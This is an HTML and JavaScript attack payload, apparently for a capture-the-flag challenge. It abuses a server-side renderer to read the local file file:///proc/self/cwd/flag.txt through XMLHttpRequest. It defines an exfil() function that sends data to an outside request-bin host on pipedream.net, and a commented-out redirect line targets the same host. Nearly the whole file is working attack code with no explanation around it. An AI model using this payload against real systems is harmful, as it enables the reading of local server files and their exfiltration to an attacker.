<script>
  x=new XMLHttpRequest;x.onload=function(){ document.body.innerText=this.responseText; };x.open("GET","file:///proc/self/cwd/flag.txt");x.send();
</script>


<html>
  <body>
    <div id="log"></div>

    <script>
      try {
        function log(msg) {
          var txt = document.createElement('div');
          txt.innerText = msg;
          document.getElementById('log').appendChild(txt);
        }

        function get(url, sucCB) {
          try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.onload = function () {
              log('[xhr.status]: ' + xhr.status);
              if (xhr.status == 200) {
                if (sucCB) {
                  sucCB(xhr.responseText)
                }
              } else {
                log('[xhr.resError]: ' + xhr.responseText);
              }
            }

            xhr.send();
          } catch (e) {
            log('[xhr.error]: ' + e);
          }
        }

        function exfil(data) {
          var url = 'http://enmgyy579qoy.x.pipedream.net?d=' + data;
          get(url, function() {
            log('[exfil.success]: ' + data);
          });
        }

        x=new XMLHttpRequest;
        x.onload=function(){ 
          document.body.innerText=this.responseText; 
        };
        x.open("GET","file:///proc/self/cwd/flag.txt");x.send();
      } catch (e) {
        log('[error]: ' + e);
      }
      //log(document.location);

      // When replacing the window, application crashes, but request is still made
      // window.location.replace('http://enmgyy579qoy.x.pipedream.net?d=windowopen');
    </script>
  </body>
</html>
